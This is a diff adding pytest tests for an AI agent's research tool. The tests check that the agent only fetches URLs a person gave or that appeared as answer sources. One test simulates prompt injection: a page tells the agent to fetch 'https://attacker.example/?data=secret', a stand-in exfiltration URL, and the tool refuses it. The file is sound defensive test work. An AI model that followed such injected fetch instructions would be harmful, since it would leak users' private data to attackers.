@@ -7,6 +7,7 @@ from typing import Any
 from joshua_core.engine import research as research_worker
 from joshua_core.engine.tools import ToolDeps
 from joshua_core.engine.tools.research import _DESCRIPTION, do_research
+from joshua_core.engine.url_grants import UrlGrants
 from joshua_core.store.models import Channel, Conversation
 from joshua_shared import config as config_module
 
@@ -104,3 +105,139 @@ async def test_the_worker_gets_the_configured_settings(monkeypatch) -> None:
 def test_the_tool_tells_the_agent_to_keep_private_detail_out_of_the_question() -> None:
     """The worker sees the question, so the question must carry no secret."""
     assert "never a private detail" in _DESCRIPTION
+
+
+# ── URLs the agent may pass ──────────────────────────────────────────────────
+
+
+def _grants(conversation_id: str = "c1", text: str = "") -> UrlGrants:
+    grants = UrlGrants()
+    if text:
+        grants.grant_from_text(conversation_id, text)
+    return grants
+
+
+async def test_a_link_the_person_sent_is_read(monkeypatch) -> None:
+    """ "Save this recipe for me" with a link in the message."""
+    seen: dict[str, Any] = {}
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        seen.update(kwargs)
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+    grants = _grants(text="save this recipe for me https://example.com/ribs")
+
+    text = await do_research(
+        _deps(),
+        settings=_settings(),
+        question="save this recipe",
+        urls=["https://example.com/ribs"],
+        grants=grants,
+    )
+
+    assert seen["urls"] == ["https://example.com/ribs"]
+    assert "Braise at 160 C" in text
+
+
+async def test_a_url_nobody_gave_is_refused(monkeypatch) -> None:
+    """A page can tell the agent to fetch something. This is where that stops."""
+    called = False
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        nonlocal called
+        called = True
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+
+    text = await do_research(
+        _deps(),
+        settings=_settings(),
+        question="read this",
+        urls=["https://attacker.example/?data=secret"],
+        grants=_grants(text="what is for dinner?"),
+    )
+
+    assert "were not read" in text
+    assert "ask them to send the link" in text
+    assert called is False
+
+
+async def test_a_source_of_an_answer_can_be_followed_up(monkeypatch) -> None:
+    """ "Look at that page again and see what it says about X"."""
+    seen: list[dict[str, Any]] = []
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        seen.append(kwargs)
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+    grants = _grants(text="how do I braise short ribs?")
+
+    await do_research(_deps(), settings=_settings(), question="ribs", grants=grants)
+    # The answer's source is granted, so the next turn may name it.
+    await do_research(
+        _deps(),
+        settings=_settings(),
+        question="does that page say anything about wine?",
+        urls=["https://example.com/ribs"],
+        grants=grants,
+    )
+
+    assert seen[1]["urls"] == ["https://example.com/ribs"]
+
+
+async def test_one_good_url_and_one_bad_one_reads_the_good_one(monkeypatch) -> None:
+    seen: dict[str, Any] = {}
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        seen.update(kwargs)
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+    grants = _grants(text="see https://example.com/ok")
+
+    text = await do_research(
+        _deps(),
+        settings=_settings(),
+        question="q",
+        urls=["https://example.com/ok", "https://attacker.example/x"],
+        grants=grants,
+    )
+
+    assert seen["urls"] == ["https://example.com/ok"]
+    assert "were not read" in text
+
+
+async def test_with_no_register_no_url_is_read(monkeypatch) -> None:
+    """With nothing recording what a person gave, nothing is granted."""
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+
+    text = await do_research(
+        _deps(),
+        settings=_settings(),
+        question="q",
+        urls=["https://example.com/x"],
+        grants=None,
+    )
+
+    assert "were not read" in text
+
+
+async def test_a_question_with_no_url_is_unaffected(monkeypatch) -> None:
+    seen: dict[str, Any] = {}
+
+    async def fake(question: str, **kwargs: Any) -> Any:
+        seen.update(kwargs)
+        return ANSWER
+
+    monkeypatch.setattr(research_worker, "research", fake)
+
+    await do_research(_deps(), settings=_settings(), question="q", grants=_grants())
+
+    assert seen["urls"] == []
